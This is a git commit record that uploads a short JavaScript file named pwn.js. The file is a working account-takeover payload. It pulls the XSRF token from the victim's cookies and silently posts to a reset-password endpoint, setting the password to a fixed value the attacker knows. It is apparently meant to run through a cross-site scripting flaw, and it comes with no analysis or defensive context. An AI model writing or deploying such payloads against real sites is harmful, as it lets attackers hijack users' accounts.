b6eee7349501d7dbc4811e386865f653bdff6b3c
shreypatelspace <contactwithshreyu@gmail.com>
2025-05-14 12:49:58 +0530

    Add files via upload

---
+++ pwn.js
@@ -0,0 +1,11 @@
+let t = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
+if(t){
+  fetch('/api/settings/reset-password', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Xsrf-Token': decodeURIComponent(t[1])
+    },
+    body: JSON.stringify("P@ssw0rd")
+  });
+}
